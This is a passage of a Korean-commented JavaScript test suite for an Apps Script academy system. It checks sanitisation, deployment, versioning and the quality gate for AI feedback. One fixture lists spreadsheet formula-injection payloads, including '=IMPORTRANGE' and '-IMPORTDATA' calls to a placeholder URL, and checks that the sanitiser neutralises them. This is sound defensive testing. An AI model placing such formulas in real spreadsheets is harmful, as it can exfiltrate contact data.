   *   위험이 같은 계급인 이유: 목소리 폼의 `미션`이 **학생·강사 손입력**이고, voice_log·point_logs가
   *   `profiles`(연락처)와 같은 스프레드시트에 산다 — v9.157이 7경로를 막을 때 유일하게 남았던 자리다. */
  const tbSrc = fs.readFileSync(path.join(ROOT, '교재연동.js'), 'utf8');
  const vsFrom = tbSrc.indexOf('function voiceSweep_(');
  assert.notEqual(vsFrom, -1, 'voiceSweep_ 정의를 찾지 못함 — 이름이 바뀌었으면 이 검사도 함께 옮겨라');
  const vs = tbSrc.slice(vsFrom, tbSrc.indexOf('\nfunction ', vsFrom + 10));
  assert.ok(/setValues\(행소독_\(vOut\)\)/.test(vs), 'voice_log 적재가 소독 통로를 지나지 않는다 — 목소리 폼 미션이 raw로 실린다');
  assert.ok(/setValues\(행소독_\(pOut\)\)/.test(vs), 'point_logs 적재가 소독 통로를 지나지 않는다');
  assert.equal(/\.setValues\((?:vOut|pOut)\)/.test(코드만(vs)), false, 'voiceSweep_에 소독 없는 적재가 남아 있다');

  // ── 탐지 능력은 픽스처로 못박는다 — 실제 셀안전_ 정의를 평가(정의 이동·문자 집합 약화 감지) ──
  const talkSrc = fs.readFileSync(path.join(ROOT, '상담AI.js'), 'utf8');
  const defFrom = talkSrc.indexOf('function 셀안전_');
  const defTo = talkSrc.indexOf('function 상담_기록_(', defFrom); // 끝 표식은 심볼 — '\n}' 앵커는 본문에 블록이 생기면 잘린다
  assert.ok(defFrom >= 0 && defTo > defFrom, '상담AI.js에서 셀안전_ 정의를 찾지 못함 — 런타임 전역 참조가 깨진다');
  const cellSafe = new Function(talkSrc.slice(defFrom, defTo) + '\nreturn 셀안전_;')();
  const safe_ = (v) => (typeof v === 'string' ? cellSafe(v) : v);
  // 시트가 수식으로 평가하는 선두는 = + - 3종. `-IMPORTDATA(...)`는 `=-IMPORTDATA(...)`로 평가돼 URL을 그대로 페치한다
  //   → 문자 집합을 /^[=+]/로 좁히는 개정이 오면 여기서 죽는다(그 전엔 = + 두 건만 검사해 절반이 열려 있었다).
  [['=IMPORTRANGE("k","A1")', '= 선두(유출 수식)'],
   ['+82 10-1234-5678', '+ 선두(연락처 답)'],
   ['-IMPORTDATA("https://x")', '- 선두(음수처럼 보이는 수식)'],
   ['@SUM(A1)', '@ 선두'],
   ['\tfoo', '탭 선두'],
   ['\rfoo', '캐리지리턴 선두']].forEach(([v, label]) => {
    assert.equal(safe_(v), "'" + v, label + '가 무력화되지 않는다');
  });
  assert.equal(safe_('Бат-Эрдэнэ'), 'Бат-Эрдэнэ', '정상 몽골 이름이 변형되면 안 된다');
  assert.equal(safe_("'=이미소독"), "'=이미소독", '멱등하지 않다 — 이미 소독된 값에 접두가 겹친다');
  const d = new Date(2026, 0, 15);
  assert.equal(safe_(d), d, 'Date(생년월일 변환·등록일 ts)는 소독을 건너뛰고 타입이 보존돼야 한다');
  assert.equal(safe_(3922), 3922, '숫자(포인트·수강료)가 문자열로 강제되면 안 된다');
});

test('[v9.66] 상담 마이그레이션은 멱등 — 스키마 가드가 앞서고, 있는 것은 전부 건너뛴다', () => {
  const mig = section('function migrateConsultV184()', 'function createLeadForm()');
  // 순서: 60열=학생ID 스키마 가드 → 시트 헤더 존재 스킵 → 폼 제목 존재 스킵 → 예능 선택지 존재 스킵
  assertOrder(mig, ["hdr[59] !== '학생ID'", 'have[h]', 'titleIdx[q[0]] !== undefined', "indexOf('예능') === -1"]);
  assert.ok(mig.includes('insertColumnsAfter'), '물리 그리드가 62열뿐인 시트에서 열 추가가 Range 예외로 죽는다');
  assert.ok(mig.includes('Math.max(62, wH) + 1'), '증분은 항상 헤더 행 끝에 append — 중간 삽입은 syncProfiles r[59] 등 인덱스 참조 전체를 밀어 파괴한다');
  assert.ok(mig.includes('showColumns'), '숨김 62열 옆 삽입은 숨김을 상속할 수 있다(리뷰 M3) — 안 보이는 열은 강사가 영원히 안 채운다');
});

test('[v9.60] 잔재 청소는 자동생성 이름 + 빈 시트만 지운다(데이터 보호)', () => {
  const body = section('function cleanupOrphanFormSheets()', 'function sweepLevelTest_()');
  assert.ok(body.includes('설문지 응답 시트'), '자동 생성 이름만 대상');
  assert.ok(body.includes('getLastRow() >= 2'), '응답이 있으면 보존해야 한다');
  assert.ok(body.includes('deleteSheet'), '삭제 경로 존재');
  // 이름 붙은 정본 시트를 지우는 경로가 생기면 안 된다
  assert.equal(/deleteSheet\(ss\.getSheetByName/.test(코드만(body)), false);
});

test('[v9.54] 루트의 모든 엔진 .js가 .claspignore 허용목록에 있다(반쪽 배포 방지)', () => {
  // 상담AI.js가 허용목록에 빠져 매니페스트·contents만 라이브로 가던 실사고(2026-07-24)의 회귀 장치.
  // 새 엔진 파일을 루트에 만들면 이 테스트가 배포 게이트에서 누락을 잡는다.
  const ig = fs.readFileSync(path.join(ROOT, '.claspignore'), 'utf8');
  const allows = ig.split(/\r?\n/).filter((l) => l.startsWith('!')).map((l) => l.slice(1).trim());
  const rootJs = fs.readdirSync(ROOT).filter((f) => f.endsWith('.js'));
  assert.ok(rootJs.length >= 1, '루트 .js 목록을 읽지 못함');
  for (const f of rootJs) {
    // [2026-08-03] `_` 접두 = 「의도적 비배포」 표식(첫 사례: 보안 사유로 철회한 두뇌 웹화면).
    //   다만 표식만으로는 실수로 흘린 임시 파일과 구분되지 않으므로, 머리말에 사유가 적혀 있어야만 예외로 인정한다.
    if (f.startsWith('_')) {
      const head = fs.readFileSync(path.join(ROOT, f), 'utf8').slice(0, 1500);
      assert.ok(head.includes('라이브 미배포'),
        `${f} 는 _ 접두라 clasp push에서 빠지는데 머리말에 사유가 없다 — 의도적 보류라면 「라이브 미배포」와 되살리는 조건을 적고, 아니라면 지우거나 이름을 바꿔라`);
      continue;
    }
    const ok = allows.some((p) => {
      const re = new RegExp('^' + p.replace(/[.+^${}()|[\]\\]/g, '\\$&').replace(/\*/g, '.*') + '$');
      return re.test(f);
    });
    assert.ok(ok, `.claspignore 허용목록에 없음: ${f} — clasp push에서 빠져 라이브가 반쪽이 된다`);
  }
});

test('[v9.55] SYNK_VERSION 상수는 파일 내 최고 버전 태그와 일치한다(배포 시 미갱신 재발 차단)', () => {
  // v9.50 미갱신을 v9.51에서 정정하고도 v9.52~54가 또 미갱신 — 두 번 나온 오류는 시스템 결함(기계 강제로 이관).
  const tags = [...code.matchAll(/\[v9\.(\d+)/g)].map((m) => Number(m[1]));
  const max = Math.max(...tags);
  const m = code.match(/const SYNK_VERSION = 'v9\.(\d+)'/);
  assert.ok(m, 'SYNK_VERSION 상수를 찾지 못함');
  assert.equal(Number(m[1]), max, `헤더 최고 태그 v9.${max} ≠ SYNK_VERSION v9.${m[1]} — 새 버전 태그를 달면 상수도 함께 올려야 한다`);
});

test('[2026-08-03] docs/버전_이력.md는 SYNK_VERSION을 따라오고, 머리말에 버전 숫자를 박지 않는다', () => {
  // 위 v9.55 가드는 Code.js 안만 본다 — 정본 문서가 뒤처져도 침묵했고, 실제로 머리말 「현재 버전 = v9.107」이
  // 36개 버전 뒤처진 채 이틀을 살았다. 값이 두 곳에 있으면 갈린다: ①문서 최신성 ②머리말 하드코딩 재발을 함께 막는다.
  const doc = fs.readFileSync(path.join(ROOT, 'docs', '버전_이력.md'), 'utf8');
  const cur = Number(code.match(/const SYNK_VERSION = 'v9\.(\d+)'/)[1]);
  const docMax = Math.max(...[...doc.matchAll(/\[v9\.(\d+)\]/g)].map((x) => Number(x[1])));
  assert.equal(docMax, cur,
    `docs/버전_이력.md 최고 태그 v9.${docMax} ≠ SYNK_VERSION v9.${cur} — 버전을 올렸으면 그 파일 맨 아래에 한 줄 추가해야 한다(/deploy 커밋 단계)`);

  const head = doc.split(/^---$/m)[0];
  /* 🚫 `코드만()` 으로 감싸지 않는다 — `head` 는 **마크다운**이지 JS 가 아니다(`**v9.NNN**` 은 굵게 표기다).
   *   JS 렉서를 대면 언어가 달라 엉뚱한 구간을 지운다. SQL 주석 제거기를 안 합치는 것과 같은 갈래. */
  assert.ok(!/현재 버전\s*=\s*\**v9\.\d+/.test(head),
    '머리말에 「현재 버전 = v9.NNN」을 박지 마라 — 아무도 안 고쳐서 반드시 낡는다. 맨 아래 마지막 항목이 현재 버전이다');
});

test('[v9.55] 이름+반 매칭 — 동명이인은 반으로 갈리고, 반 오기재도 이름 유일이면 구제된다', () => {
  const match = loadFunction('function matchStudentsByNameClass_', 'function sweepTeacherMemoForm_', 'matchStudentsByNameClass_', {});
  const roster = [
    { sid: 'S1', n: '테무진', c: '월수 A' }, { sid: 'S2', n: '테무진', c: '화목 B' },
    { sid: 'S3', n: '사라', c: '월수 A' }
  ];
  assert.deepEqual(match(roster, '사라', '월수 A'), ['S3']);
  assert.deepEqual(match(roster, ' 사라 ', '기타'), ['S3']);   // 공백 정규화 + '기타'는 이름만
  assert.deepEqual(match(roster, '사라', '화목 B'), ['S3']);   // 반 오기재 — 이름이 유일하면 구제
  assert.deepEqual(match(roster, '테무진', '화목 B'), ['S2']); // 동명이인 — 반으로 확정
  assert.equal(match(roster, '테무진', '기타').length, 2);     // 동명이인 + 반 미상 = 복수 반환(호출부가 미매칭 처리)
  assert.deepEqual(match(roster, '없는애', '월수 A'), []);
});

test('[v9.55] 약점 메모 스위프 — 미매칭은 sid 공란+상태 미매칭(소비처 오염 0) + 포인터 클램프', () => {
  const body = section('function sweepTeacherMemoForm_(', 'function aiFeedbackBatch_(');
  assert.ok(body.includes("'약점메모폼_포인터'"), '전용 포인터 필요(sweepLeadForm 패턴)');
  assert.ok(body.includes('from > last'), '응답 시트 행 삭제 시 포인터 클램프가 없으면 영구 스킵');
  assert.ok(body.includes("ok ? cands[0] : ''"), '매칭 실패는 sid 공란 — 소비처 3곳이 전부 sid 공란을 스킵하는 전제를 고정');
  assert.ok(body.includes("'미매칭'"), '상태=미매칭이 사람 복구 경로(H열 지우고 sid 채움)');
});

test('[v9.55] 약점 메모 스위프는 수업 전 메일보다 먼저 돈다(같은 10분 틱의 메모가 메일에 실린다)', () => {
  const body = section('function parentSweep()', 'function translateTopics_(');
  assertOrder(body, ["safeRun('sweepTeacherMemoForm'", "safeRun('classPrepMail'"]);
});

// ───────────────────────── v9.56 트렌드 팩 회귀 장치 ─────────────────────────

test('[v9.56] 월 테마는 「이달의 무대」 — 구 "월 시즌" 표기가 학생 화면에 되살아나지 않는다', () => {
  assert.ok(code.includes("'월의 무대 · '"), '이달의시즌 배너 값은 「N월의 무대 · 이름」 형식');
  assert.equal(코드정제.includes("'월 시즌 · '"), false, '구 표기 부활 금지 — "시즌"은 커리큘럼 8주 트랙 전용(유호 07-24)');
  // [08-27] 구 「리그 결과 공지도 무대 표기」 검사는 과녁이 사라졌다 — 반 대항 리그 폐지(유호 지시 A).
  //   남은 자리(이달의시즌 배너)는 위 두 줄이 그대로 지킨다.
});

test('[v9.56] 시즌 패스 트랙 — 입력 셀 정본·형식 검증·미설정 시 통째 생략', () => {
  const calc = section('function calcAll()', 'function writeSharedCols_');
  assert.ok(calc.includes("'시즌트랙입력'"), 'app_state 입력 셀이 정본');
  assert.ok(calc.includes('/^\\d{4}-\\d{2}-\\d{2}$/'), '시작일 형식 검증 없이 파싱하면 깨진 날짜로 주차가 NaN');
  assert.ok(calc.includes('seasonT: seasonCfg ?'), '걸어온길 주입은 설정 있을 때만(null이면 카드에서 생략)');
  // [함께한날 막6] 여정 카드 은퇴 — 시즌 트랙 줄은 걸어온길(BY77)이 잇는다(설계 §2-㉢ 「시즌 사이 빈 화면 방지」)
  const road = section('function buildWalkedRoadHtml_(', 'function buildAttCalHtml_(');
  assert.ok(road.includes('o.seasonT'), '미설정(null) 생략 분기 고정');
  assert.ok(road.includes('🎫 시즌'), '트랙 블록 렌더');
});

test('[v9.56] 추천 현황 — leads 추천인 집계가 여정 카드 한 줄로 흐른다(0명이면 비표시)', () => {
  const calc = section('function calcAll()', 'function writeSharedCols_');
  assert.ok(calc.includes('refCntByName'), 'leads 추천인(E열) 집계');
  const road = section('function buildWalkedRoadHtml_(', 'function buildAttCalHtml_(');
  assert.ok(road.includes("(o.refN || 0) > 0 ?"), '0명일 땐 줄 자체가 생략돼야 한다');
});

test('[v9.56] 교실 스크린 — 10분 보드에 편승하되 실패 격리·분 단위 시계 금지(업데이트 예산 보호)', () => {
  const body = section('function todayBoard_(', 'function expandHwBatch()');
  assert.ok(body.includes("setAppState_(ss, '교실스크린HTML'"), '스크린 HTML은 app_state 한 키');
  assert.ok(body.includes('catch (eScr)'), '스크린 실패가 출결 보드를 깨면 안 된다');
  const scrSeg = body.slice(body.indexOf('교실 스크린 모드'));
  assert.equal(/formatDate\(now,\s*tz,\s*'HH:mm'\)/.test(코드만(scrSeg)), false,
    '분 단위 시계를 넣으면 내용이 매 스위프 바뀌어 야간·주말에도 sync가 깨어난다');
});

test('[v9.56] 이달의 카드 인쇄 — 최신 발간월만 모아 Drive 저장·PDF 실패 시 HTML 폴백 안내', () => {
  const body = section('function printMonthlyCards()', '// [v9.12] 🗺️ 시냅스 여행 지도');
  assert.ok(body.includes("getSheetByName('synk_cards')"));
  assert.ok(body.includes("'SYNK_인쇄'"), '고정 폴더 — 파일이 드라이브 루트에 흩어지지 않게');
  assert.ok(body.includes("getAs('application/pdf')"));
  assert.ok(body.includes('Ctrl+P'), 'PDF 변환 실패 폴백 안내(비개발자 절차)');
});

test('[v9.56] 첨삭 통보 메일에 시트 바로가기(#gid)가 붙는다 — [v9.63] 격리 복구·수동검수 공용 다리', () => {
  const body = section('function aiFeedbackBatch_(', 'function callClaudeFeedback_');
  assert.ok(body.includes("'#gid=' + (ss.getSheetByName('hw_feedback')"));
  // v9.56 원형: 자동공개면 링크 소멸. v9.63 개정: 무인 모드에서도 "격리가 있으면" 링크가 떠야 한다(사람 백스톱 경로).
  assert.ok(body.includes('(held || (made && !AI_FEEDBACK_AUTOPUBLISH))'), '링크 조건 = 격리 발생 또는 수동검수 모드');
});

test('[v9.57] 톱레벨 크로스파일 참조 금지 — 전역 초기화 순서 크래시(상담AI.gs:27 실사고) 기계 차단', () => {
  // Apps Script는 파일 순서대로 전역을 초기화한다. 어떤 파일의 톱레벨 코드가 다른 파일의 전역을 읽으면
  // 순서에 따라 ReferenceError로 "프로젝트 전체"(모든 트리거·실행)가 즉사한다 — 07-24 라이브 실사고.
  const rootJs = fs.readdirSync(ROOT).filter((f) => f.endsWith('.js'));
  const topLevel = {}, declared = {};
  const 어긋난추출 = [];   // [09-06] 아래 «자기 정직» 검사가 채운다
  for (const f of rootJs) {
    const src = fs.readFileSync(path.join(ROOT, f), 'utf8');
    let out = '', depth = 0, st = null;
    for (let i = 0; i < src.length; i++) {
      const c = src[i], n = src[i + 1];
      if (st === '//') { if (c === '\n') { st = null; out += c; } }
      else if (st === '/*') { if (c === '*' && n === '/') { st = null; i++; } }
      else if (st === '"' || st === "'" || st === '`') {
        if (c === '\\') i++;
        else if (c === st) st = null;
      }
      else if (c === '/' && n === '/') st = '//';
      else if (c === '/' && n === '*') { st = '/*'; i++; }
      else if (c === '"' || c === "'" || c === '`') st = c;
      else if (c === '{') { depth++; out += ' '; }
      else if (c === '}') { depth--; out += ' '; }
      else if (depth === 0) out += c;
    }
    // 🔴 [09-06] 자기 정직 검사 — 이 추출기는 정규식 리터럴을 모른다. 정규식 안 맨 따옴표(' " `)를
    //   문자열 시작으로 읽으면 그 뒤 { } 가 안 세어져 «파일 뒤 구간이 통째로 톱레벨에서 사라진다» —
    //   즉 아래 크로스파일 검사가 반쪽 초록이 된다(증상 없음 · 09-06 실측 Code.js·엔진_콘텐츠AI.js 끝깊이 1).
    //   정상 파일은 끝 깊이 0 이고 문자열 밖에서 끝난다. 어긋나면 파일 이름·깊이를 대고 빨강을 세운다.
    //   처방 = 그 파일 정규식 안 따옴표를 \u0027 · \u0022 · \u0060 으로 적는다(동작 동일 · 실물 = Code.js escHtml_).
    //   기억 regex-quote-desyncs-toplevel-scanner. ⚠ 줄끝 한 줄 주석(//)으로 끝나는 파일은 정상이라 안 센다.
    if (depth !== 0 || st === "'" || st === '"' || st === '`') {
      어긋난추출.push(f + '(끝깊이 ' + depth + ' · 끝상태 ' + (st === null ? '없음' : JSON.stringify(st)) + ')');
    }
    topLevel[f] = out;
    declared[f] = new Set([...out.matchAll(/(?:^|[\s;])(?:const|let|var|function)\s+([A-Za-z_$가-힣][\w$가-힣]*)/g)].map((m) => m[1]));
  }
  // 🔴 [09-06] 위 자기 정직 검사의 판정 — 어긋난 파일이 하나라도 있으면 아래 크로스파일 검사를
  //   «돌리기 전에» 멈춘다. 어긋난 채로 통과한 초록은 그 파일 뒤 구간을 안 본 반쪽 초록이라,
  //   믿으면 다음 사고를 못 막는다(0건이 성공 얼굴 · 기억 zero-is-a-success-face-taxonomy).
  assert.equal(어긋난추출.length, 0,
    '톱레벨 추출기가 어긋났다 → ' + 어긋난추출.join(' · ') +
    ' — 정규식 안 맨 따옴표를 문자열 시작으로 읽어 그 뒤가 톱레벨 검사에서 사라진다. 그 파일 정규식 안 따옴표를 유니코드 이스케이프로 적을 것');

  // [v9.135] strict 복원 — 분할 2단계가 유일한 톱레벨 크로스파일 참조(SHEET_SKELETON)를 위해 열어 둔
  // filePushOrder 순방향 허용을 닫는다(골격이 지연 평가 함수로 바뀌어 전제 소멸). 순서가 보증되는
  // 참조라도 톱레벨 크로스파일 참조는 전면 금지. 이 추출기는 { } 안을 못 보는 사각이 있다 —
  // 🔴 실행 층 이중 검증은 ⚰tests/로드시뮬.test.js(정순·역순 vm) 가 맡았다 — ⚠삭제됨 e75fc7fc 2026-08-19 — 지금 없다.
  //    즉 위에 적은 「{ } 안을 못 보는 사각」을
  //    **메우는 자가 지금 없다.** 사각을 안다고 적어 둔 뒤 그것을 맡을 자를 잃은 자리다.
  for (const f of rootJs) for (const g of rootJs) {
    if (f === g) continue;
    for (const name of declared[g]) {
      if (declared[f].has(name)) continue; // 동명 재선언은 별개 문제(전역 충돌 검사가 따로 있음)
      const re = new RegExp('(?<![\\w$\uAC00-\uD7A3])' + name.replace(/[$]/g, '\\$&') + '(?![\\w$\uAC00-\uD7A3])');
      assert.ok(!re.test(topLevel[f]),
        `${f} 톱레벨이 ${g}의 전역 '${name}'을 참조 — 파일 초기화 순서에 따라 전 트리거가 죽는다. 함수 안(호출 시점)으로 옮길 것`);
    }
  }
});

test('[v9.57] clasp filePushOrder는 Code.js를 선두로 고정한다(전역 초기화 순서 보증)', () => {
  const cj = JSON.parse(fs.readFileSync(path.join(ROOT, '.clasp.json'), 'utf8'));
  assert.ok(Array.isArray(cj.filePushOrder) && cj.filePushOrder.length >= 1, 'filePushOrder가 비어 있으면 파일 순서 무보증');
  assert.equal(cj.filePushOrder[0], 'Code.js', '공용 상수 정본(Code.js)이 가장 먼저 초기화돼야 한다');
  // [2026-08-02 분할 2단계] 엔진 분할부는 원본 단일 Code.js의 원래 순서 그대로 이어져야 한다.
  // 어긋나면 테스트(합본은 ENGINE_FILES 순서)는 통과하는데 라이브만 죽는다 — 위 크로스파일 허용 조건의 전제.
  assert.deepEqual(cj.filePushOrder.slice(0, ENGINE_FILES.length), ENGINE_FILES,
    'filePushOrder 선두가 ENGINE_FILES(로드 순서 정본)와 다르다 — 톱레벨 참조가 라이브에서만 죽는다');
});

test('[v9.61] preflight는 학생 입력 폼 3종 미생성을 경고한다(버튼이 조용히 안 그려지는 결함)', () => {
  // 2026-07-24 실측: 출석폼URL틀·숙제폼URL틀이 없어 CX102·CY103이 공란 → Glide Open-link 버튼 전원 미렌더.
  // 컴포넌트는 존재해 눈으로 하는 조립 점검을 통과했다 → 기계 경고로 이관.
  const body = section('function preflightGlide()', 'function safeRun(name, fn)');
  // [v9.138] 퀴즈폼 편입 — 수집기의 입구가 없는 것은 "버튼이 안 그려진다"보다 무겁다(그날의 답은 다시 못 받는다)
  // [09-02 폼 넷] 강사 폼 둘 편입 — 반 출석·출퇴근(대장 「잇는다 — 폼 신설」 · 없으면 수업 시작 출석·근태의 입구가 0이다)
  ['출석폼URL틀', '숙제폼URL틀', '약점메모폼URL', '퀴즈폼URL틀', '반출석폼URL', '출퇴근폼URL'].forEach((k) => {
    assert.ok(body.includes(`'${k}'`), `preflight가 ${k} 부재를 감시해야 한다`);
  });
  ['createAttendanceForm', 'createHwForm', 'createTeacherMemoForm', 'createQuizForm', 'createClassAttendanceForm', 'createTeacherCheckinForm'].forEach((fn) => {
    assert.ok(body.includes(fn), `경고문이 처방(${fn} 실행)을 담아야 한다`);
  });
});

/* ── [v9.63] 첨삭 무인 발행 + 품질 게이트 (유호 07-25 확정) ─────────────── */

test('[v9.63] 품질 게이트가 정상 카드는 통과시키고 불량 카드는 사유와 함께 거른다', () => {
  /* [v9.223] 게이트가 옛글자 판정을 쓰게 되면서 의존이 생겼다. **스텁을 지어 넣지 않는다** — 스텁은
   *   사본이라 실물이 바뀌어도 이 시험은 계속 초록이고, 그 침묵이 정확히 이 게이트가 막으려는 실패 모양이다.
   *   🔴 그 짝 `tests/옛글자런타임.test.js` 는 ⚠삭제됨 e75fc7fc 2026-08-19 — 지금 없다(아래 괄호는 그때 배선).
   *   같은 소스에서 진짜 함수를 잘라 넣는다(탐지력은 `tests/옛글자런타임.test.js` 가 따로 진다). */
  const 옛글자짚기_ = loadFunction('function 옛글자짚기_(글)', 'function 옛글자걸림_(', '옛글자짚기_', {});
  const 옛글자걸림_ = loadFunction('function 옛글자걸림_(값, 경로)', 'function aiText_(', '옛글자걸림_', { 옛글자짚기_ });
  const gate = loadFunction('function fbQualityGate_(card, srcText)', 'function aiFeedbackBatch_()', 'fbQualityGate_', { 옛글자걸림_ });
  const good = {
    corrected: '저는 어제 학교에 갔어요.',
    point_mn: 'Өнгөрсөн цагийг -았/었 гэж бичнэ (과거형).',
    praise: '과거 시제를 정확한 자리에 썼어요!',
    mission: '-았/었어요를 써서 새 문장 하나를 만들어 보세요.'
  };
  assert.equal(gate(good, '저는 어제 학교에 가요.').ok, true);
  assert.equal(gate(Object.assign({}, good, { point_mn: '과거형을 잘 썼어요' }), 'x').reason, '몽골어없음:오늘의포인트');
  assert.equal(gate(Object.assign({}, good, { mission: '' }), 'x').reason, '빈칸:다음미션');
  assert.equal(gate(Object.assign({}, good, { praise: '아직 부족하지만 잘했어요' }), 'x').reason, '금칙어:부족');
  assert.equal(gate(Object.assign({}, good, { praise: '죄송하지만 문장을 이해하지 못했어요' }), 'x').reason, '메타문구');
  // [v9.65 리뷰 H1] 사과 단원·AI 주제 숙제의 원문은 corrected에 정당하게 남는다 — 격리하면 무인 목적 훼손
  assert.equal(gate(Object.assign({}, good, { corrected: '늦어서 죄송합니다.' }), '늦어서 죄송해요').ok, true);
  assert.equal(gate(Object.assign({}, good, { corrected: '저는 인공지능을 공부해요.' }), '저는 인공지능 공부해요').ok, true);
  assert.equal(gate(Object.assign({}, good, { mission: 'Дараагийн даалгавар' }), 'x').reason, '한글없음:다음미션');
  assert.equal(gate(Object.assign({}, good, { praise: good.praise + ' ```json' }), 'x').reason, '형식잔재');
  // 무의미 제출문을 원문 그대로 되돌린 경우(프롬프트 규칙 5)는 정당 — 한글 없어도 통과
  assert.equal(gate(Object.assign({}, good, { corrected: 'asdf123' }), 'asdf123').ok, true);
  assert.equal(gate(Object.assign({}, good, { corrected: 'random english only' }), '다른 제출문').reason, '한글없음:고친문장');
});

test('[v9.63] 무인 발행은 게이트 통과분만 노출하고 미달분은 격리로 남긴다', () => {
  const body = section('function aiFeedbackBatch_()', 'function callClaudeFeedback_(');
  assert.ok(body.includes('fbQualityGate_(card, text)'), '생성 직후 게이트 호출이 있어야 한다');
  assert.ok(body.includes("gate.ok ? (AI_FEEDBACK_AUTOPUBLISH ? '노출' : '대기') : '격리:' + gate.reason"),
    '상태 기록은 게이트 판정이 무인 스위치보다 먼저여야 한다(미달 카드는 어떤 모드에서도 미노출)');
  assertOrder(body, ['callClaudeFeedback_(apiKey, stu, text)', 'fbQualityGate_(card, text)', 'fb.appendRow']);
  assert.ok(body.includes("' · 격리 ' + held"), '관리자 메일 제목에 격리 수가 떠야 한다(무인 발행의 사람 백스톱)'); // [v9.65 L2] 제목 형식 개정에 맞춤
});

test('[v9.63] 격리·오류 카드는 학생 표면(포인트 정산·성장카드 짝·오류사전·약점퀴즈 재료)에 새어들지 않는다', () => {
  const ack = section('function sweepFeedbackAck_(ss)', 'function matchStudentsByNameClass_');
  /* [v9.211] 검사 대상을 **표기에서 통로로** 옮긴다. 옛 판은 소비처 3곳에 거부목록 표기가
   * 그대로 있는지를 봤는데, 그 표기 자체가 구멍이었다(`대기` 를 통과시킨다 · 이종검수 P1
   * #9136f31e61a9). 표기를 못박은 회귀가 **구멍을 못박고 있었던** 셈이라, 이제 넷 다
   * 판정 정본(노출카드_)을 타는지로 검사한다 — 격리·오류에 더해 `대기` 까지 함께 막힌다. */
  assert.ok(ack.includes('!노출카드_(r[8])'), '첨삭 포인트 정산이 판정 정본을 안 탄다');
  assert.ok(code.includes('!노출카드_(rG[8])'), '성장카드 짝 로더가 판정 정본을 안 탄다');
  assert.ok(code.includes('오류뱅크전진_(슬라이스.map(r => r[8]), 슬라이스.map(r => r[2]), Date.now())'), '오류사전 로더가 커서 통로(오류뱅크전진_ · 안에서 노출카드_·닫힌카드_)를 안 탄다'); // [v9.211] 커서 수리 · 격리 복구 창(제출일 C열 기준)은 그다음 판
  assert.ok(code.includes('!r[1] || !노출카드_(r[8])'), 'AI 약점 로더(aiWeakMap_)가 판정 정본을 안 탄다'); // v9.64 세션이 위탁 반영한 1줄의 회귀 고정
});

test('[v9.64] 연습 포인트 폼 — 재실행=제자리 업그레이드(복제·URL 교체 차단) + 아침 자동 동기화', () => {
  const body = section('function createTeacherMemoForm()', 'function importFormResponses()');
  assertOrder(body, ['syncTeacherMemoForm_', 'FormApp.create']); // 동기화 가드가 생성보다 앞 — 재실행 시 복제 경로로 못 간다
  const sync = section('function syncTeacherMemoForm_', 'function createTeacherMemoForm()');
  assert.equal(/\.add[A-Z]\w*Item\(/.test(sync.replace(/\/\/[^\n]*/g, '')), false,
    '업그레이드 경로에서 항목 추가 금지 — 응답 시트에 새 열이 생겨 sweep 위치 파싱(1~6열)이 깨진다');
  const morning = section('function morningJobs()', 'function nightJobs()');
  assert.ok(morning.includes("safeRun('teacherMemoFormSync'"), '아침 로스터 자동 동기화 미편입');
});

test('[v9.64] 유형 선택지에 말하기·읽기 포함(코어=문법·톡=회화 커리큘럼 축 정합)', () => {
  const m = code.match(/const TEACHER_MEMO_TYPES = \[([^\]]+)\]/);
  assert.ok(m, 'TEACHER_MEMO_TYPES 상수(폼 유형 정본)가 필요');
  ['문법', '말하기', '읽기', '기타'].forEach((t) => assert.ok(m[1].includes(`'${t}'`), `유형 '${t}' 누락`));
  const 계약 = require('../계약/수집_교정_계약.json');
  const 폼값 = m[1].split(',').map(s => s.trim().replace(/^'|'$/g, ''));
  assert.deepStrictEqual(폼값, 계약.learning_events.값목록.관찰영역, 'c14 관찰영역 값록 = 라이브 폼 TEACHER_MEMO_TYPES 그대로(계약 c14 문안이 산문으로만 묶은 것을 기계로 — 순서까지 같아야 한다)');
  assert.ok(code.includes("SCHEMA_VER = '" + 계약.버전 + "'"), '손사본 SCHEMA_VER 가 계약 버전과 갈라졌다(v9.261 전과)');
});

test('[v9.64] 반복 자동 감지 — 브리핑·수업 전 메일 ×N, AI 로더는 반복 우선 정렬(강사 기입 부담 0)', () => {
  const brief = section('const errByCls', 'let briefAI');
  assert.ok(brief.includes('cnt') && brief.includes('×'), '브리핑 ×N 집계 누락');
  assert.ok(brief.includes('sort'), '브리핑 반복 우선 정렬 누락 — slice(0,3)이 끈질긴 포인트를 골라야 한다');
  const mail = section('const errByClass', 'const bdayByClass');
  assert.ok(mail.includes('cnt') && mail.includes('×'), '수업 전 메일 ×N 집계 누락');
  const ai = section('function aiWeakMap_(', "const fb = ss.getSheetByName('hw_feedback')");
  assert.ok(ai.includes('반복') && ai.includes('sort'), 'AI 로더 반복 우선("유형: 메모 (반복 n회)") 누락');
});

/* [v9.211] 오류태그 → 약점맵 합류(철학정합 §3-B) — 「23유형 기록」이 학생에게 되돌아가는 첫 배선.
 *   행동으로 잰다(소스 정규식은 집계 방식 변이를 못 잡은 전례가 있다 — learner-state 변이 실측 축).
 *   지키는 것: ①태그 빈도 상위 2가 첨삭 항목의 **꼬리**에 실린다 ②「오류없음」은 약점으로 안 센다
 *   ③격리 행은 태그 집계에서도 빠진다 ④항목 수 불변 — 소비처 slice(-2)에서 강사 손메모가 안 밀린다
 *   ⑤14일 창 밖 태그 미집계 ⑥포인트 빈 행의 태그도 버리지 않는다. */
test('[v9.211] aiWeakMap_ 오류태그 빈도 합류 — 보조 신호는 첨삭 꼬리로만, 손메모 자리 불변', () => {
  const aiWeakMap_ = loadFunction('function aiWeakMap_(', 'function aiStudioBatch_()', 'aiWeakMap_', {
    toDate_: (v) => (v instanceof Date ? v : (v ? new Date(v) : null)),
    // 정본을 그대로 주입한다 — 여기서 손으로 흉내내면 그게 판정의 두 번째 벌이 된다(이 픽스처만 안 새는 상태)
    노출카드_: 노출카드정본()
  });
  const d0 = new Date(Date.now() - 86400000);          // 어제(14일 창 안)
  const dOld = new Date(Date.now() - 20 * 86400000);   // 창 밖
  const hw = (sid, point, tags, status, d) => {
    const r = new Array(13).fill('');
    r[1] = sid; r[2] = d || d0; r[5] = point; r[8] = status || '노출'; r[12] = tags || '';
    return r;
  };
  const se = (sid, type, memo) => { const r = new Array(8).fill(''); r[0] = d0; r[1] = sid; r[3] = type; r[4] = memo; return r; };
  const ss = {
    getSheetByName: (n) => (n === 'student_errors'
      ? mkSheet_([new Array(8).fill('h'), se('S1', '문법', '은/는 헷갈림')])
